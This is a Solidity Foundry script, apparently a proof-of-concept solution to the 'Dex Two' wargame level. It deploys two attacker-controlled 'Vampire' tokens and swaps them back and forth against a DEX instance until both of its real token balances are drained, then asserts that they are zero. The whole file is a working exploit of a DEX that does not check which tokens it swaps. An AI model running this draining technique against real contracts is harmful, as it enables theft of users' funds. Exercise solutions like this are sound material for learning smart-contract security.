// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/23_IDexTwo.sol";
import "../src/23_DexTwo.sol";

address constant INSTANCE = 0x4c991485c56a33ed027002c1D0EFe1e46bFa887d;

contract DexTwoPOCScript is Script {
    IDex2 instance = IDex2(INSTANCE);

    function _swing(address token1, address token2) internal {
        IERC20(token1).approve(INSTANCE, 300);
        IERC20(token2).approve(INSTANCE, 300);

        instance.swap(token1, token2, 10);
        instance.swap(token2, token1, 20);
        instance.swap(token1, token2, 24);
        instance.swap(token2, token1, 30);
        instance.swap(token1, token2, 41);
        instance.swap(token2, token1, 45);
    }

    function run() external {
        vm.startBroadcast();

        VampireToken _vToken1 = new VampireToken("Vampire Token 1", "VMP1", msg.sender, INSTANCE);
        VampireToken _vToken2 = new VampireToken("Vampire Token 2", "VMP1", msg.sender, INSTANCE);
        vm.label(address(_vToken1), "Vampire Token A");
        vm.label(address(_vToken2), "Vampire Token B");

        address token1 = instance.token1();
        address token2 = instance.token2();
        vm.label(token1, "Token A");
        vm.label(token2, "Token B");

        _swing(token1, address(_vToken1));
        _swing(token2, address(_vToken2));

        vm.stopBroadcast();

        assert(instance.balanceOf(token1, INSTANCE) == 0);
        assert(instance.balanceOf(token2, INSTANCE) == 0);
    }
}
